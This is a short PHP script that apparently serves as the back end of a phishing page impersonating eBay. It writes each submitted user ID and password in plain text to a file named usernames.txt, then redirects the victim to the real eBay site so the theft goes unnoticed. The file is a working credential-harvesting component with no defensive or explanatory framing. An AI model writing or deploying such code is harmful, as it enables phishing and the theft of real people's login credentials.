<?php

file_put_contents("usernames.txt", "Account: " . $_POST['userid'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ebay.com');
exit();
